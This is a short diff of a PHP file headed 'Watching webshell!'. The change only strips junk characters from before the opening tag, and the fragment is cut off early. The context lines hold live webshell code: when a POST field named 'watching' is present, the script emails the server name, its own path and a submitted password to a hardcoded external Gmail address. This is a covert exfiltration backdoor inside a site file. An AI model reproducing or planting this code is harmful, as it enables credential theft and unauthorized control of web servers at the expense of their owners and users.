@@ -1,4 +1,4 @@
-hsvsjshsbsbsbsjsjsbbssksnns<?php
+<?php
 //--------------Watching webshell!--------------
 if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hadiarsawinata146@gmail.com', 'root', $tmp); // Edit or delete!
